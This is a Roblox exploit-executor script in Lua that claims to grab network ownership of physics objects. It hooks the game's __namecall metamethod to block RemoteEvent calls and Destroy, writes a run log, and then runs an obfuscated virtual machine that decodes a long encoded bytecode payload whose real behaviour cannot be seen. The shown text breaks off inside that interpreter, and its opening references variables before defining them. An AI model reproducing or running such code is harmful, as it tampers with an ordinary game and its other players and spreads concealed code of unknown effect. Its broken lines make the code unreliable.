-- Berds Ownership Script v2.0.0
local remote = v
local old = mt.__namecall
local decalsyeeted = true
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
local PlayerInstance;
local sethiddenprop = (sethiddenproperty or set_hidden_property or sethiddenprop or set_hidden_prop)
local setsimulationrad = setsimulationradius or set_simulation_radius or function(Radius) sethiddenprop(PlayerInstance, "SimulationRadius", Radius) end
if not getgenv or not sethiddenprop or not setsimulationrad then return false end -- Not supported
if NETWORKOWNER then NETWORKOWNER:Disconnect() NETWORKPLAYERCHECK:Disconnect() NETWORKPLAYERCHECK2:Disconnect() end
getgenv().NETWORK_RADIUS = NETWORK_RADIUS or math.huge

if not isfile("network-ownership.log") then
    writefile("network-ownership.log", "Script executed on game "..game.PlaceId.."!\n")
else
    appendfile("network-ownership.log", "Script executed on game "..game.PlaceId.."!\n")
end

if not game:IsLoaded() then
    appendfile("network-ownership.log", "Waiting for game to load...\n")
    game.Loaded:Wait() -- Wait for game
end

for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do

if v:IsA("RemoteEvent") then
print(v)
local mt = getrawmetatable(game)
setreadonly(mt, true)
make_writeable(mt)
hookfunction(v.Destroy, function() return wait(9e9) end)
mt.__namecall = newcclosure(function(self, ...)
    if self == remote and getnamecallmethod() == "FireServer" then
        return wait(9e9)
    end
    return old(self, ...)
end)

end
end


return (function(net_h, net_i, net_q)
    local net_l = string.char
    local net_e = string.sub
    local net_m = table.concat
    local net_n = math.ldexp
    local net_s = getfenv or function()
            return _ENV
        end
    local net_o = select
    local net_g = unpack or table.unpack
    local net_j = tonumber
    local function net_k(net_h)
        local net_b, net_c, net_d = "", "", {}
        local net_f = 256
        local net_g = {}
        for net_a = 0, net_f - 1 do
            net_g[net_a] = net_l(net_a)
        end
        local net_a = 1
        local function net_i()
            local net_b = net_j(net_e(net_h, net_a, net_a), 36)
            net_a = net_a + 1
            local net_c = net_j(net_e(net_h, net_a, net_a + net_b - 1), 36)
            net_a = net_a + net_b
            return net_c
        end
        net_b = net_l(net_i())
        net_d[1] = net_b
        while net_a < #net_h do
            local net_a = net_i()
            if net_g[net_a] then
                net_c = net_g[net_a]
            else
                net_c = net_b .. net_e(net_b, 1, 1)
            end
            net_g[net_f] = net_b .. net_e(net_c, 1, 1)
            net_d[#net_d + 1], net_b, net_f = net_c, net_c, net_f + 1
        end
        return table.concat(net_d)
    end
    local net_k =
        net_k(
        "25Q25Y27525W25U27525Y24X25325724Z25W26527923O24J25426U23P24Z24K24G25B25127E26327H24Z25424Y27N23P24I24Z24M24M24Z24Y25W25T27925125525425424Z25124I25W25V27924L24M25324H25425W26728825524K25524J24I25B28C25W25S28824K24Z25328025W25X28I24V28N26127924X24Z24I24K28L27D24I29325325025627E26027925725325924Z23T24H24K25B28029K29M25W26627925427C28D25325625627F2A324Z24H25125125625524L24J29128G27924M29W25428F27827524H28R25925W26N27925A24I24I24M26U28J24V26U2512532AP26U25024Z26U24Y25B24L29Z2842B624J24S26U24V28T26U24J24L2BC24L25527D2B325A29X24I2B524Z24U24M2AG29X28627923Q25625324V27N24L2AA27524A2552B72562C82CA27N28O27924525A25329F28E2CM28H27528K25B24K2CD27G27524129D2CP25B25624Y29128N29627524F24L24725W25E2792442A725623P2CH29S24I24528A24L29E25328W28F29A27524E28W29C2DQ2542DS29F2DV2C627524224Z2E425524V2872752D125Y2A128I29D28V25424X2CD2EE25Y23Q25A24V24L27Q2CD25M2C72ES2EU25124L24325427P28S25427D2AP2A723M25A28S2B02A02AR25Y2F324J25725W25P2792F32F52BU27V29I2CJ2EZ2EV2FB2FD24I2A02A22E82BF2BH2852642792472A825524H23P29M28127625H2EJ24I2EU25724J2C928V28A29F2BE2BQ27729P29325A2GR27525A24J29C27927527427525G23T27925Z2H02H02H725W25Y26U2H82EH25Y25G2752H72FG2HD25Y2H72H728H2HL2HN25Y28Z25I2H02962H72HH2H62HE2HI2HF2HL2H02HB26E2H02872A22HY27528P2H32I12G52752HQ2HM25Y27G2HY2HB2IF2HC2762HF2EG2II2HA2HG2IP2IN2HL2HB2HB2IK2752962IW2J125Y2962IR2IY2J52HE2HB2H72H82JC25Y2GF2762G025Y2BR2B02E02EO2EY2ET2EV25W2IN2G72AG2GA2GC24M2762FG27B27D2JR2792D324I27M27O27Q27E2EP2CK2CB2CZ2CE25Y2CG2CI2KB2CM2HU27523O28125627Q29325B28A2402CH2GQ2IC25Y2AT24K25928J25327R25W25J2GG2BX24Y27X2542AN25528324K2BZ25W2KK25Y23P25B2GJ2GL2KR25423O2532GP24L2JE2JD2HE21226H25W25D27924B25324U2LK2FJ2LJ2LL2KQ28A2LP2LR25W2JG2JJ29D2GI2GK2M82542GO25B2GQ2IN27I2542K627P2L32KW24E2922LE2BB2932GV2KX2DU24I2H826R27925G2DX2II2G62HZ2HB2I32792I52HV25Y2782IA25Y2CV2IO2H828Z2IL25Y2EP2H82J82NC2752I92IE2792LH25Y28P2HX2H02EG2HY2HO2792IH2H72872O725Y2NV2HF2622792I62J929O27T2H82HW2IU2792O32I12NK2OA2O92I12H72OC2HB2N72OG2962OI2HE2OL2NI2LH2OG2H72P02NR2II2NI2OQ2HE2NN2IP2L52I02NS2HE2HH2NT2JF2JA2II2FG2HZ25Y26V2PP2NP2ND2JI2JK2EL2EN2E72EQ2FU2F12K22752JT2G92GB24Z2GD2EH2MD2JK2MG2LM2GN2LQ2ML2CD2FG29Q24I2GU2FG2GX2GZ2H02PF2HG24K2PS2LU2NB2PM2OG2J42NH2H02NK2O42HS2O62OT2PT2NO28Z2IG2IP2HB2NQ2HR2HB2R82R52HF2RC2OM2962R92NL2962962NQ2J82DB2I42N82H92792N72MZ2K027E2IN2K42MQ2K82Q325Y2MO2S32MS2792MU2CR24I2MX2AQ27923L2N12EI2752PW2JM2PZ2ER2JP2Q22JS2G82JV2Q82JX2EH2QR2JK2L72L92LB2LD2LF2KA2C92KC2D02792KG2A72KI24K2LY2M02M22M42572M62MH2GM2LO2QG2BQ25Z2611Z26Q26S22G1426P24B2LG2792TI2QE2TL2LR2H82FM2H32N72JE26U22M2P82NO2RS2P82QW2H82782PK2NK2ND2P92H02RM2QV2NL2I725Y2QY2OB2NZ2OM2752IN2R32U72R627G2OA2OE2NO2OJ2RK25Y29O2I02P22H02UW2R62RA2IS2IJ2NL2HR2V22IP2N72HY2OZ2I02J92HJ2HE2JC2PR2I127526T2PU2GG2PX2JN2752SO2F02CD2SR2JU2Q72Q92RY2A52S52S227N2MR2S027H27J2S827S27U27W27Y2802822842MZ2SH2C52FG28C24U28F2T42CL2KD2EG2K42D52D72D92KE2T92CJ2T52CM2LZ2752M12M32GJ2TH2M42U02MA2QH25Z2242272XL2XL2332LX2LH2TZ2MI2XH2TN2VN2CN27528928S28U28W27E2RM2912AI2K12V424829D2KY2592472AE2EA2CD2HB27523T24129528I2LK2MC2GG2QD2MI2MK2GQ25F2GG23T2YP2TK23T2YR2VZ27A29D29C2F428Y2YO2YM2EG2JK2552QL2CC2YM2N724W28W24Y24H29X2BX2F929L27E2N729C2DT24H29H29J2ZM2KE2JK2912LQ28A25624V2YK2752552D72PZ23T23T2ZG2C12KE28C2AD2AF2AH2AJ2Y22902922942NK2L128M2RM2EG2AL2CW2CI2A92NK29I2ZU2RM28W2BR2LE25W2YG25Y2YI31022JJ2YM2JZ2W92WW2T62X42CH2TA2X72TC2X925Y2XB2TG2XR2TK2XT2LS2H824622H2462TX275311L2LN311N2JE2NK2W82K1311A2CC311C2KH311F2TD2XA2TF2XD311V2M92TM2CD2XQ2XF2XS312D2H82KW25G24R2PS2PK2UE2NF2PK2R02VE2VD2RE2VG2II2962OA2UI2VT2EH26S2H02432HF2V82RU2792PO2RT2782O12HF2JE25W26D2J92H825K2RI2HF25S2452HF2PR2JE25U23U279313Q2HG29A296311226U25N2J92RO2OM2782HK27531452NJ2R1313I2OM28Z2RM2HL314D2PT314F2R42OC287312K2NU25Y2IN27928H2A22JC24C2J928H2HX24Y2J9313Z2J431432HY31482VD31482UI28H2RS2HY314G2VD314G2OS2R428Z314K2VF2ID2US314P275314R2N8314U296314W2752VS2RU2V72EH311831212C7311F2T72D22D42BX2X227V310Q25Y2CX2WY2T8311D2X62WX25W2V42QC25129W24M310V2A0311H311J312A312G311M312D311T2LI316Q311W316S2NK24M310S3167316L310H275310Y27N28F311231142RS2GI2LT25Y311Q246313F2ND316N31292M5316V312C2MB312F2M7316R2U2314A2792U42H82PK2LT317C2OA31122PS25W2692N524L313E2RH2J82UE2RR2RT2J82VL2NG2HE27831802J42HB28H2PO26A2P929A314S2O624J2US2A22NB318R2A22A228H25S2422PT313H2OU2NG313T2753192313W2US2UM2542UT2EP2HY2G52NQ2EF3138314N27G313D2A22UM2IB2PT315J2G52JI2ON319I2US319K25Y2KK2872EP319Y2US319L2UT27525S2EX2KW2HR25Y23Z2792NQ313K318T313M313O2A231973147319525Y31972N62UT2IW23O2UT28P2J0314O25Y2OE2VD2G52G52V42VF2UC2752OE319D27527T31B62V631BA2H827G29O314T2UT319W25G25831AP2RH28P31AT2OM2G531AX2NL31AZ25Y31B127G31B331AW319P2OM27T2JI2HY29O315V319T31BE275314U31BN2JC2L5319N25S2H7296318P2HB313S279318P2PQ2PS311Z316Y2DU2KD31782YJ317A2YM310U2BH2MZ2ZF27W2I425O2N529O2JB2N5318I2RH31432UC2J831542752YT2HX29A2872HK2VV319Z314931CJ2R4312J2VN314L313M27528727T2HR31CI31B72PN31AL31DD319831DG2O622F2PT2872UI319M2HE2O02HE31DP2HB2R928731DZ31AK27931EF2562R4311231CD2HF315R31CH31AL315R25Y26F313L27931EJ2J8313U2PS2FG25W2ZE2ZG2ZI2QL2DV2BH25X317C2OB311S2RS3104314Y2ND315V25G23V31862OK2VN313C2PM318G25Y26O2IP31CG319431DL2H72BP314Z313I31EJ313Y2N5313X318E27923M31G32HE31ER2NF3130314B2I02JE31FQ2762EG24029F27D23T23P28328425Z25J31GP31GQ21Z2LX31BQ2472LE25B2ZF25125B2A724E2442SJ25Y24F2E329I2542L32RS310C316F2DI2ZG2BH24324G2FR2XW2KX2AU2L12L32FG2482W931BQ2WQ24I2KT24K2X12852NK24W31GI27E311224I24W31F9276315V2DK2G931I02A52AG24L2CD2V424I2AH24L29129Q31092TC2KW2C92DS31IB2K12FG28V2512AV2FG2402CY27E315X2WE31622K52WC2S42MN2WG31J52S92DY2MV2SD310J2PZ28928B28D28F310L24H2SI3122316A31J331HX2X331CO2CY31612KF316C2TB31HD2SK2MF316I25B316K31CW317I2XC317K317P316W317N2TY317L2U12XI2XK2XM2272XO2YN31JZ2GH31KC2YZ25W2YT31KK2YV31KC2YY316S2RM2QC31172GS2QL2MZ2QO27E2Z829D2ZA25A2ZC2FK310L28K28M2RS315V311127931I4316731IR29N27931I924H31LI31ID2CD31KV31K1316K25W31GU31GW31GY31H025631H22MZ31IY2AK31IO25331IQ31I12MZ31IU25931F92LW2MZ2QK2GU31HZ2AG28R31HK2YA31HN2WI27531IH31IE31IK2DU2WK24K31I62NR26M2N526K31FJ318B31D531MY2NO2JE318D31EL2J431FS31DV31A231FT275318331DE2HF2RS25S26Y2OD2VE31N82OE2HJ31AL2DH31ND31CH2O626Z313L2HP2RB31DM31NV313D2HB319S2IP2IT2NO2EP2PO2N42HX23Y2HF312K26Q2J92J331422VF31532RU2HY28H318H318E2782UI31G02RF314731A431G32HB313331ND28Z31BQ31FW314G2HP23L315F31DM318328Z31D425U26H2HF314131NP2US27924031862RF26P2HF319D29A2HB2V431NG2HF27331NJ31AL31PP31NM27931NH31O72HF31FG31PH31D431EG31NB318N31N126W31FX315J27831OD314831AU31G8315A3136314A318Y2H031FO318031432PO318A31N22H0315T2JE2RM31MT25X31LT2G631LV27Q31LX31LZ2NK31HH31HJ2FG31JL29X31MA31P82H62DH27526O23S313931PQ31RD2H726O31MV319O2IT31N831E931AO31CE318Q31NJ2HC31P12HR2CV31NC318631N82GF31PW2H72UM31FO2H025G31O82RL31392722II31RY3198315831RP28H318K31RR314931SE31OQ319G25Y314U28H2872HJ31P82H731DT315S2PS310P2PV2EK2SM2KA2Q12W32G62SS2W62SV312031J225Y2WB2K72L331JN31JU2X531JX2LH2KM2C32KP2TK2KT2512KV27931MJ28K2L331JK2N12H82VK2U62H02592NA2UO2UJ2UR296312S315M2RH2UL2OM2RJ2PG2I22HE2OC2H72IN2NY31RM2O22VN31DU2VQ31ST313125Y23K2N523R2UJ315J31312NI31462H828H2R32RM31O32XV2HF2NI31592NF2752UR2A22962NI2EP2PK28P2UB31V2313D31UU2VA31N031B431VK315I2VN31UT31BT31VO31VM31FG2H02NY2RV31OP2RW31VM31VC2P131U02752QR2UJ31VH2UU2PK2GF2NO31R92PM312P31EH31W225Y25C2EH313H31OK314U31O131WI2PS25G24E279311H2NI2IA2PK2742PK25R31WC2OM2H731D12P831GC31NE31G625Y24731Q32PD2IG318R314G31WW31XC2R42FM25S244314926B2II28Z31N831XL31PT2Q431X925Y2EX2792702PT2R2314N314131DN31F928Z31UH2R431XU2UP31XY2US313K31Y12PC2UT2H72OG28H314125L2UQ31U5313K2OE31EM2H726X2II31EP27931YP31ND31FV279313N2II2412RU31N831YZ31XQ25Y31WQ31YU31CL2U52HF31332H324Z2J92VV2VD314331OB31OG31ZE2NL314831OB2UJ31FM2NO2N4315J29631YI31Q731BX2P831ZO2IP31GE31WN31G027931832J82VR2PS2MD31H42SL2EM2Z02W12JQ2W42Q62JW2JY29B2W92S129D2WH2SN31603124311E316E31TG2KN31TJ2LN31TL31TN2AS31HM31TQ27E2SX29D2SZ27V2T131763101317O2TJ31K92XI31UJ2LV2LX31K5311K31KC311N31KJ2ME31KL31K82QF2MB31J72MP31J927E2MT31JC2SE2MZ31R42N22H031ZQ319831UN31X82I131WD2IP31U2318E2PA31U631YW31U831BY2UD31WF31UD31AV27531UG2UK319T315J2O5312U2II315E2HR2OV31ZV31YJ2OH31VQ31FK31W62OO2II2PB2VE322R2II322T2OX2J42P72NF31W62P42I1323931W52UU31DK31WF31XA2HB31W431MZ2PK2PJ2HE2MD323F313A2N831QP2H023P31G12QU31PE32252HC318R2RT26E25A27931U33222323H26U2282NM322D31SK31NV2PK2A231VD2PM31W62VB32312RH2HR31XA2J631UL31G02V131VW2HF2PO31PA31SB32492OE31SI31XA2872IR31U52872UE31SI27T2R92782FM2O531N8325C31NA25Y324X3244318E29O29A325J2782HU31CB2JE31SA31YR27531SA31AO31UT26U26J2H831W92I131WB2P831W631KP2RV31VU2H031WH31W6311H2UM31XW313R31AL326E325G27131Q32H1323X2H731WY31PD2VE31EC2EX311231A931AB2HE25I31YT25Y31D12RF29A326N2H031PE312V313G31MY326X2II2FM32712II326O275327531YQ31WN31EX319X23W2II326S31X0325H31N0318J31UL318C2IP31YA323A318F31V231FM2IX2II2HD2NO31ZT322D315T32773143279313K3188319X326Y2HD327C31VX3241313L3133328731X624S313L31VX31VA31D72J9323Q31S22NF31D4318D31ZJ327731OM2H0318331G031CA2I031N831FM31Z731Z02ND2QR2ZP2A427D310S29H25A2552852EP2K424E2B024M317131CW2RM27J31TQ31TY2H62IA25G22931MY323F31QJ31FL2VN2RS31RG31RC31NZ327H31N8318P31RL323T2QU31XN2PI323H315J28Z2RS314I32AD31AC31GB31A5322E31OQ329431VR313R329929B29D329C2A62A8329F329H2WA29D24925025831JI2CD31CV310W279329R2L2329T2HI2QR329W329Y31WM32A032AQ31372I131RH2HF31N731AL31CK323U322C323S2HH313031QD32AI32AN32AK31DR32AM2R431SK323S32AP321D2SG323X313131FW2RT32CB324631SG31QH327I2HE31WL3186325W323H327731A9314N31WM2NI2UY2P82PK312Y327X3277327J31SL323F32CL314E324232AL32CN31GB327V318C327231NW31FW2HR325631WJ31X6313K2IT328F31PC2HS31NH2HB325F31Z3325F31N831MV31PB312K2522VO31WZ328O322I32CG31OK32922RN2IQ3144322U31A631SH312T326V31GB323W31QI319X2IP27G312S278314M314931F932EC31OI32DY32BT31G731862HL31SF31AU31OW31YW2EX28728Z326U314Q2H02YT31P52HF2KK27827G31XA28Z2V42HY28731C432AN31Q02IP32CG27926L31Q331PL2N531S525Y2N725Y320332CK31PK2RU26U31OO32ED3280323K2NL327T318D32CS31432HU2HL31432L532G62J92HH31OG2MD32ER2J9326331QG27922E31G631XN31AL31G531FV31P128P2A22YT31S42VF31WH32AL31BN31EC31NH28P31AR31DU31AL32H131SG32GQ25Y32GS31O827G311H2PT32GX2HS313O28P32GN313932GM328132GP2US2H2318328P31D431EM27831Z5324V31AL32HT32972JE"
    )
    local net_a = (bit or bit32)
    local net_d = net_a and net_a.bxor or function(net_a, net_c)
            local net_b, net_d, net_e = 1, 0, 10
            while net_a > 0 and net_c > 0 do
                local net_f, net_e = net_a % 2, net_c % 2
                if net_f ~= net_e then
                    net_d = net_d + net_b
                end
                net_a, net_c, net_b = (net_a - net_f) / 2, (net_c - net_e) / 2, net_b * 2
            end
            if net_a < net_c then
                net_a = net_c
            end
            while net_a > 0 do
                local net_c = net_a % 2
                if net_c > 0 then
                    net_d = net_d + net_b
                end
                net_a, net_b = (net_a - net_c) / 2, net_b * 2
            end
            return net_d
        end
    local function net_c(net_c, net_a, net_b)
        if net_b then
            local net_a = (net_c / 2 ^ (net_a - 1)) % 2 ^ ((net_b - 1) - (net_a - 1) + 1)
            return net_a - net_a % 1
        else
            local net_a = 2 ^ (net_a - 1)
            return (net_c % (net_a + net_a) >= net_a) and 1 or 0
        end
    end
    local net_a = 1
    local function net_b()
        local net_b, net_e, net_c, net_f = net_h(net_k, net_a, net_a + 3)
        net_b = net_d(net_b, 214)
        net_e = net_d(net_e, 214)
        net_c = net_d(net_c, 214)
        net_f = net_d(net_f, 214)
        net_a = net_a + 4
        return (net_f * 16777216) + (net_c * 65536) + (net_e * 256) + net_b
    end
    local function net_j()
        local net_b = net_d(net_h(net_k, net_a, net_a), 214)
        net_a = net_a + 1
        return net_b
    end
    local function net_f()
        local net_b, net_c = net_h(net_k, net_a, net_a + 2)
        net_b = net_d(net_b, 214)
        net_c = net_d(net_c, 214)
        net_a = net_a + 2
        return (net_c * 256) + net_b
    end
    local function net_p()
        local net_a = net_b()
        local net_b = net_b()
        local net_e = 1
        local net_d = (net_c(net_b, 1, 20) * (2 ^ 32)) + net_a
        local net_a = net_c(net_b, 21, 31)
        local net_b = ((-1) ^ net_c(net_b, 32))
        if (net_a == 0) then
            if (net_d == 0) then
                return net_b * 0
            else
                net_a = 1
                net_e = 0
            end
        elseif (net_a == 2047) then
            return (net_d == 0) and (net_b * (1 / 0)) or (net_b * (0 / 0))
        end
        return net_n(net_b, net_a - 1023) * (net_e + (net_d / (2 ^ 52)))
    end
    local net_n = net_b
    local function net_r(net_b)
        local net_c
        if (not net_b) then
            net_b = net_n()
            if (net_b == 0) then
                return ""
            end
        end
        net_c = net_e(net_k, net_a, net_a + net_b - 1)
        net_a = net_a + net_b
        local net_b = {}
        for net_a = 1, #net_c do
            net_b[net_a] = net_l(net_d(net_h(net_e(net_c, net_a, net_a)), 214))
        end
        return net_m(net_b)
    end
    local net_a = net_b
    local function net_n(...)
        return {...}, net_o("#", ...)
    end
    local function net_l()
        local net_h = {}
        local net_e = {}
        local net_a = {}
        local net_i = {
            [#{"1 + 1 = 111", "1 + 1 = 111"}] = net_e,
            [#{{632, 797, 65, 894}, "1 + 1 = 111", {264, 651, 9, 983}}] = nil,
            [#{"1 + 1 = 111", "1 + 1 = 111", {531, 847, 849, 955}, "1 + 1 = 111"}] = net_a,
            [#{{733, 101, 560, 930}}] = net_h
        }
        local net_a = net_b()
        local net_d = {}
        for net_c = 1, net_a do
            local net_b = net_j()
            local net_a
            if (net_b == 0) then
                net_a = (net_j() ~= 0)
            elseif (net_b == 1) then
                net_a = net_p()
            elseif (net_b == 2) then
                net_a = net_r()
            end
            net_d[net_c] = net_a
        end
        for net_a = 1, net_b() do
            net_e[net_a - 1] = net_l()
        end
        net_i[3] = net_j()
        for net_i = 1, net_b() do
            local net_a = net_j()
            if (net_c(net_a, 1, 1) == 0) then
                local net_e = net_c(net_a, 2, 3)
                local net_g = net_c(net_a, 4, 6)
                local net_a = {net_f(), net_f(), nil, nil}
                if (net_e == 0) then
                    net_a[3] = net_f()
                    net_a[4] = net_f()
                elseif (net_e == 1) then
                    net_a[3] = net_b()
                elseif (net_e == 2) then
                    net_a[3] = net_b() - (2 ^ 16)
                elseif (net_e == 3) then
                    net_a[3] = net_b() - (2 ^ 16)
                    net_a[4] = net_f()
                end
                if (net_c(net_g, 1, 1) == 1) then
                    net_a[2] = net_d[net_a[2]]
                end
                if (net_c(net_g, 2, 2) == 1) then
                    net_a[3] = net_d[net_a[3]]
                end
                if (net_c(net_g, 3, 3) == 1) then
                    net_a[4] = net_d[net_a[4]]
                end
                net_h[net_i] = net_a
            end
        end
        return net_i
    end
    local function net_m(net_a, net_k, net_f)
        net_a = (net_a == true and net_l()) or net_a
        return (function(...)
            local net_d = net_a[1]
            local net_e = net_a[3]
            local net_p = net_a[2]
            local net_n = net_n
            local net_b = 1
            local net_h = -1
            local net_l = {}
            local net_r = {...}
            local net_o = net_o("#", ...) - 1
            local net_j = {}
            local net_c = {}
            for net_a = 0, net_o do
                if (net_a >= net_e) then
                    net_l[net_a - net_e] = net_r[net_a + 1]
                else
                    net_c[net_a] = net_r[net_a + #{"1 + 1 = 111"}]
                end
            end
            local net_o = net_o - net_e + 1
            local net_a
            local net_e
            while true do
                net_a = net_d[net_b]
                net_e = net_a[1]
                if net_e <= 67 then
                    if net_e <= 33 then
                        if net_e <= 16 then
                            if net_e <= 7 then
                                if net_e <= 3 then
                                    if net_e <= 1 then
                                        if net_e > 0 then
                                            local net_e = net_a[2]
                                            local net_f = net_a[4]
                                            local net_d = net_e + 2
                                            local net_e = {net_c[net_e](net_c[net_e + 1], net_c[net_d])}
                                            for net_a = 1, net_f do
                                                net_c[net_d + net_a] = net_e[net_a]
                                            end
                                            local net_e = net_e[1]
                                            if net_e then
                                                net_c[net_d] = net_e
                                                net_b = net_a[3]
                                            else
                                                net_b = net_b + 1
                                            end
                                        else
                                            local net_a = net_a[2]
                                            do
                                                return net_c[net_a](net_g(net_c, net_a + 1, net_h))
                                            end
                                        end
                                    elseif net_e > 2 then
                                        local net_g
                                        local net_k, net_j
                                        local net_i
                                        local net_e
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_i = net_c[net_a[3]]
                                        net_c[net_e + 1] = net_i
                                        net_c[net_e] = net_i[net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_k, net_j = net_n(net_c[net_e](net_c[net_e + 1]))
                                        net_h = net_j + net_e - 1
                                        net_g = 0
                                        for net_a = net_e, net_h do
                                            net_g = net_g + 1
                                            net_c[net_a] = net_k[net_g]
                                        end
                                    else
                                        local net_a = net_a[2]
                                        local net_b = net_c[net_a]
                                        for net_a = net_a + 1, net_h do
                                            net_i(net_b, net_c[net_a])
                                        end
                                    end
                                elseif net_e <= 5 then
                                    if net_e > 4 then
                                        local net_b = net_a[2]
                                        local net_d = net_c[net_b]
                                        for net_a = net_b + 1, net_a[3] do
                                            net_i(net_d, net_c[net_a])
                                        end
                                    else
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                    end
                                elseif net_e == 6 then
                                    net_c[net_a[2]] = net_k[net_a[3]]
                                else
                                    local net_b = net_a[2]
                                    net_c[net_b] = net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                                end
                            elseif net_e <= 11 then
                                if net_e <= 9 then
                                    if net_e == 8 then
                                        local net_g
                                        local net_e
                                        net_e = net_a[2]
                                        net_c[net_e](net_c[net_e + 1])
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_g = net_c[net_a[3]]
                                        net_c[net_e + 1] = net_g
                                        net_c[net_e] = net_g[net_a[4]]
                                    else
                                        net_c[net_a[2]][net_a[3]] = net_a[4]
                                    end
                                elseif net_e > 10 then
                                    local net_a = net_a[2]
                                    do
                                        return net_g(net_c, net_a, net_h)
                                    end
                                else
                                    net_c[net_a[2]] = {}
                                end
                            elseif net_e <= 13 then
                                if net_e == 12 then
                                    local net_f
                                    local net_e
                                    net_e = net_a[2]
                                    net_f = net_c[net_a[3]]
                                    net_c[net_e + 1] = net_f
                                    net_c[net_e] = net_f[net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_a[3]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    if (net_c[net_a[2]] == net_c[net_a[4]]) then
                                        net_b = net_b + 1
                                    else
                                        net_b = net_a[3]
                                    end
                                else
                                    net_c[net_a[2]] = net_c[net_a[3]] - net_c[net_a[4]]
                                end
                            elseif net_e <= 14 then
                                local net_g
                                local net_h
                                local net_e
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = {net_c[net_e](net_c[net_e + 1])}
                                net_g = 0
                                for net_a = net_e, net_a[4] do
                                    net_g = net_g + 1
                                    net_c[net_a] = net_h[net_g]
                                end
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_b = net_a[3]
                            elseif net_e > 15 then
                                if (net_c[net_a[2]] == net_c[net_a[4]]) then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            else
                                net_c[net_a[2]] = net_f[net_a[3]]
                            end
                        elseif net_e <= 24 then
                            if net_e <= 20 then
                                if net_e <= 18 then
                                    if net_e > 17 then
                                        local net_i
                                        local net_j, net_k
                                        local net_e
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_j, net_k = net_n(net_c[net_e](net_c[net_e + 1]))
                                        net_h = net_k + net_e - 1
                                        net_i = 0
                                        for net_a = net_e, net_h do
                                            net_i = net_i + 1
                                            net_c[net_a] = net_j[net_i]
                                        end
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        do
                                            return net_c[net_e](net_g(net_c, net_e + 1, net_h))
                                        end
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        do
                                            return net_g(net_c, net_e, net_h)
                                        end
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        do
                                            return
                                        end
                                    else
                                        local net_f = net_a[2]
                                        local net_e = {}
                                        for net_a = 1, #net_j do
                                            local net_a = net_j[net_a]
                                            for net_b = 0, #net_a do
                                                local net_b = net_a[net_b]
                                                local net_d = net_b[1]
                                                local net_a = net_b[2]
                                                if net_d == net_c and net_a >= net_f then
                                                    net_e[net_a] = net_d[net_a]
                                                    net_b[1] = net_e
                                                end
                                            end
                                        end
                                    end
                                elseif net_e == 19 then
                                    net_c[net_a[2]] = net_c[net_a[3]] / net_c[net_a[4]]
                                else
                                    local net_b = net_a[2]
                                    do
                                        return net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                                    end
                                end
                            elseif net_e <= 22 then
                                if net_e == 21 then
                                    local net_g
                                    local net_i
                                    local net_h
                                    local net_l
                                    local net_k
                                    local net_e
                                    net_e = net_a[2]
                                    net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
